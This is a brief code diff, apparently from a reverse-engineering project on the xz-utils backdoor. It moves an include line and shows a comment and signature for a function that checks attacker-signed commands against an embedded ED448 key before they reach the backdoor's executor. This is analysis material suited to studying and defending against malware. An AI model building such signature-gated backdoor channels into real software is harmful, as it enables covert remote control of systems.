@@ -7,8 +7,8 @@
 /*
  * AutoDoc: Computes the host-key hash, loads the attacker’s ED448 public key, and runs EVP_DigestVerify on the supplied signature. This gate keeps the backdoor command channel—only messages signed with the embedded ED448 key reach the executor.
  */
-#include "xzre_types.h"
 
+#include "xzre_types.h"
 
 BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u64 signed_data_size,
                      u8 *signature,u8 *ed448_raw_key,global_context_t *global_ctx)
